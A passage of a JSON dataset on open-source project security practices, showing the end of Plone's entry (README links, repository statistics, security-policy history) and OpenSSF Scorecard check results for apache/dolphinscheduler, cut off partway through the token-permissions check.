on.\n\n\n<h2 align=\"center\">\nOfficial Resources\n</h2>\n\n* [plone.org](https://plone.org/) - Official website for developers, community, decision makers, and evaluators.\n* [Plone support](https://plone.org/support) - Where to find help.\n* [community.plone.org](https://community.plone.org/) - Official community forum, the best place to get help.\n* [Plone 6 Documentation](https://6.docs.plone.org/) - Official documentation for developers, integrators, and content editors.\n* [training.plone.org](https://training.plone.org/) - Trainings for developers, integrators, content editors, and designers.\n* [`plone.api`](https://6.docs.plone.org/develop/plone.api/docs/index.html) - Documentation for `plone.api`.\n* [`plone.restapi`](https://plonerestapi.readthedocs.io/en/latest/) - Documentation for `plone.restapi`.\n* [Discord](https://discord.gg/zFY3EBbjaj) - Official Plone chat, voice, and video service.\n\n<h2 align=\"center\">\nThis project is supported by\n</h2>\n\n<p align=\"center\">\n    <a href=\"https://plone.org/foundation/\">\n      <img alt=\"Plone Logo\" width=\"200px\" src=\"https://raw.githubusercontent.com/plone/.github/main/plone-foundation.png\">\n    </a>\n</p>\n\n<h2 align=\"center\">\nLicense\n</h2>\nThe project is licensed under the GPLv2.\n",
        "num_commits": 6276,
        "project_age_days": 4784,
        "project_created_at": "2011-09-25",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-29",
        "num_contributors": 169,
        "num_pull": 1465,
        "num_issues": 4034,
        "num_opening_issue": 500,
        "project_size(kB)": 130690,
        "num_stargazers": 250,
        "num_watchers": 250,
        "num_forks": 188,
        "num_subscribers": 172,
        "SecurityPolicy_created_at": "2021-09-13 08:50:53",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "4a402f36858814d851932bb3defef6161cfc1b8b",
                "url": "https://github.com/plone/Products.CMFPlone/commit/4a402f36858814d851932bb3defef6161cfc1b8b",
                "date": "2022-08-07 10:49:34"
            },
            {
                "commit_id": "2d7bfd45acf310fb10ebd15c727c875fc5ecf9dc",
                "url": "https://github.com/plone/Products.CMFPlone/commit/2d7bfd45acf310fb10ebd15c727c875fc5ecf9dc",
                "date": "2021-09-13 08:50:53"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "apache/dolphinscheduler",
        "project_url": "https://github.com/apache/dolphinscheduler",
        "SSF": {
            "date": "2024-10-29T23:57:13+07:00",
            "repo": {
                "name": "github.com/apache/dolphinscheduler",
                "commit": "5f319e518314e9aacd29e697a987446c155f964b"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.8,
            "checks": [
                {
                    "details": [
                        "Warn: binary detected: .mvn/wrapper/maven-wrapper.jar:1"
                    ],
                    "score": 9,
                    "reason": "binaries present in source code",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'dev'",
                        "Info: 'force pushes' disabled on branch 'dev'",
                        "Info: required approving review count is 2 on branch 'dev'",
                        "Warn: codeowners review is not required on branch 'dev'",
                        "Info: status check found to merge onto on branch 'dev'",
                        "Info: PRs are required in order to make changes on branch 'dev'"
                    ],
                    "score": 8,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 out of 30 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "all changesets reviewed",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: varletjs contributor org/company found, tetrateio contributor org/company found, apache @research.cvte contributor org/company found, moon studio @moon-studio contributor org/company found, apache contributor org/company found, ikun-svelte contributor org/company found, apache @selectdb contributor org/company found, apache @streamnative contributor org/company found, tsinghua university contributor org/company found, SkyAPM contributor org/company found, yasa-org contributor org/company found, alibaba contributor org/company found, refeema contributor org/company found, cisco contributor org/company found, changan auto contributor org/company found, alibaba cloud contributor org/company found, coder • @apache @w3c @varletjs @ikun-svelte contributor org/company found, analysys contributor org/company found, TsinghuaX contributor org/company found, influxtsdb contributor org/company found, apolloconfig contributor org/company found, copy-actions contributor org/company found, hugegraph contributor org/company found, china contributor org/company found, selectdb contributor org/company found, w3c contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 26 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: :0"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 11 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/api-test.yml:54: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/api-test.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/api-test.yml:67: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/api-test.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/api-test.yml:75: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/api-test.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/api-test.yml:90: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/api-test.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/api-test.yml:121: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/api-test.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/api-test.yml:125: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/api-test.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/api-test.yml:134: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/api-test.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/api-test.yml:139: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/api-test.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/api-test.yml:153: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/api-test.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/api-test.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/api-test.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/backend.yml:152: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/backend.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/backend.yml:160: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/backend.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/backend.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/backend.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/backend.yml:59: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/backend.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/backend.yml:72: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/backend.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/backend.yml:76: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/backend.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/backend.yml:84: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/backend.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/backend.yml:97: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/backend.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/backend.yml:121: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/backend.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/backend.yml:128: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/backend.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yaml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/codeql.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yaml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/codeql.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yaml:58: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/codeql.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/docs.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/docs.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/docs.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:57: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/docs.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:73: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/docs.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:87: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/docs.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e-k8s.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/e2e-k8s.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e-k8s.yml:54: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/e2e-k8s.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e-k8s.yml:67: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/e2e-k8s.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e.yml:42: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/e2e.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e.yml:56: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/e2e.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e.yml:69: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/e2e.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e.yml:77: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/e2e.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e.yml:92: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/e2e.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e.yml:149: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/e2e.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e.yml:153: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/e2e.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e.yml:162: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/e2e.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e.yml:167: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/e2e.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/e2e.yml:180: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/e2e.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/frontend.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/frontend.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/frontend.yml:62: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/frontend.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/frontend.yml:69: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/frontend.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/frontend.yml:93: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/frontend.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/issue-robot.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/issue-robot.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/mergeable.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/mergeable.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/owasp-dependency-check.yaml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/owasp-dependency-check.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/owasp-dependency-check.yaml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/owasp-dependency-check.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/owasp-dependency-check.yaml:56: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/owasp-dependency-check.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-docker.yaml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/publish-docker.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-docker.yaml:49: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/publish-docker.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-docker.yaml:51: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/publish-docker.yaml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-docker.yaml:75: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/publish-docker.yaml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-docker.yaml:81: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/publish-docker.yaml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-docker.yaml:83: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/publish-docker.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-helm-chart.yaml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/publish-helm-chart.yaml/dev?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-helm-chart.yaml:51: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/publish-helm-chart.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-nexus.yaml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/publish-nexus.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-nexus.yaml:44: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/publish-nexus.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-nexus.yaml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/publish-nexus.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-nexus.yaml:52: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/publish-nexus.yaml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pull-request-target-robot.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/pull-request-target-robot.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pull-request-target-robot.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/pull-request-target-robot.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/stale.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/stale.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/unit-test.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/unit-test.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/unit-test.yml:62: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/unit-test.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/unit-test.yml:70: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/unit-test.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/unit-test.yml:74: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/unit-test.yml/dev?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/unit-test.yml:86: update your workflow using https://app.stepsecurity.io/secureworkflow/apache/dolphinscheduler/unit-test.yml/dev?enable=pin",
                        "Warn: containerImage not pinned by hash: .github/workflows/cluster-test/mysql_with_mysql_registry/Dockerfile:18: pin your Docker image by updating eclipse-temurin:8-jre to eclipse-temurin:8-jre@sha256:000b9b6748f0efa66bf104f90243cc1122c1d4b023884883526539c342df6d75",
                        "Warn: containerImage not pinned by hash: .github/workflows/cluster-test/mysql_with_zookeeper_registry/Dockerfile:18: pin your Docker image by updating eclipse-temurin:8-jre to eclipse-temurin:8-jre@sha256:000b9b6748f0efa66bf104f90243cc1122c1d4b023884883526539c342df6d75",
                        "Warn: containerImage not pinned by hash: .github/workflows/cluster-test/postgresql_with_postgresql_registry/Dockerfile:18: pin your Docker image by updating eclipse-temurin:8-jre to eclipse-temurin:8-jre@sha256:000b9b6748f0efa66bf104f90243cc1122c1d4b023884883526539c342df6d75",
                        "Warn: containerImage not pinned by hash: .github/workflows/cluster-test/postgresql_with_zookeeper_registry/Dockerfile:18: pin your Docker image by updating eclipse-temurin:8-jre to eclipse-temurin:8-jre@sha256:000b9b6748f0efa66bf104f90243cc1122c1d4b023884883526539c342df6d75",
                        "Warn: containerImage not pinned by hash: dolphinscheduler-dist/src/main/docker/alert-server.dockerfile:18: pin your Docker image by updating eclipse-temurin:8-jdk to eclipse-temurin:8-jdk@sha256:e1f6f65cb607e76e57562b34c8e52cd3eebd5a5b8e8754599ff6d6e91d5429be",
                        "Warn: containerImage not pinned by hash: dolphinscheduler-dist/src/main/docker/api-server.dockerfile:18: pin your Docker image by updating eclipse-temurin:8-jdk to eclipse-temurin:8-jdk@sha256:e1f6f65cb607e76e57562b34c8e52cd3eebd5a5b8e8754599ff6d6e91d5429be",
                        "Warn: containerImage not pinned by hash: dolphinscheduler-dist/src/main/docker/master-server.dockerfile:18: pin your Docker image by updating eclipse-temurin:8-jdk to eclipse-temurin:8-jdk@sha256:e1f6f65cb607e76e57562b34c8e52cd3eebd5a5b8e8754599ff6d6e91d5429be",
                        "Warn: containerImage not pinned by hash: dolphinscheduler-dist/src/main/docker/standalone-server.dockerfile:18: pin your Docker image by updating eclipse-temurin:8-jdk to eclipse-temurin:8-jdk@sha256:e1f6f65cb607e76e57562b34c8e52cd3eebd5a5b8e8754599ff6d6e91d5429be",
                        "Warn: containerImage not pinned by hash: dolphinscheduler-dist/src/main/docker/tools.dockerfile:18: pin your Docker image by updating eclipse-temurin:8-jdk to eclipse-temurin:8-jdk@sha256:e1f6f65cb607e76e57562b34c8e52cd3eebd5a5b8e8754599ff6d6e91d5429be",
                        "Warn: containerImage not pinned by hash: dolphinscheduler-dist/src/main/docker/worker-server.dockerfile:18: pin your Docker image by updating eclipse-temurin:8-jdk to eclipse-temurin:8-jdk@sha256:e1f6f65cb607e76e57562b34c8e52cd3eebd5a5b8e8754599ff6d6e91d5429be",
                        "Warn: downloadThenRun not pinned by hash: .github/workflows/schema-check/mysql/start-job.sh:25",
                        "Warn: downloadThenRun not pinned by hash: .github/workflows/schema-check/postgresql/start-job.sh:25",
                        "Warn: npmCommand not pinned by hash: .github/workflows/docs.yml:59",
                        "Warn: downloadThenRun not pinned by hash: .github/workflows/e2e-k8s.yml:105",
                        "Warn: npmCommand not pinned by hash: .github/workflows/frontend.yml:75",
                        "Warn: downloadThenRun not pinned by hash: .github/workflows/unit-test.yml:83",
                        "Info:   0 out of  67 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   7 out of  11 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of  10 containerImage dependencies pinned",
                        "Info:   0 out of   4 downloadThenRun dependencies pinned",
                        "Info:   0 out of   2 npmCommand dependencies pinned"
                    ],
                    "score": 1,
                    "reason": "dependency not pinned by hash detected -- score normalized to 1",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Info: all commits (30) are checked with a SAST tool"
                    ],
                    "score": 10,
                    "reason": "SAST tool is run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/apache/.github/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/apache/.github/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/apache/.github/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/apache/.github/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/owasp-dependency-check.yaml:34",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/publish-docker.yaml:32",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/publish-docker.yaml:33",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/publish-helm-chart.yaml:32",
                        "Warn: jobLevel 'packages' permission set to 'write': .github/workflows/publish-helm-chart.yaml:33",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/pull-request-target-robot.yml:26",
                        "Warn: no topLevel permission defined: .github/workflows/api-test.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/backend.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/codeql.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/docs.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/e2e-k8s.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/frontend.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/issue-robot.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/mergeable.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/owasp-dependency-check.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish-docker.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish-helm-chart.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish-nexus.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/pull-request-target-robot.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/unit-test.yml:1"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
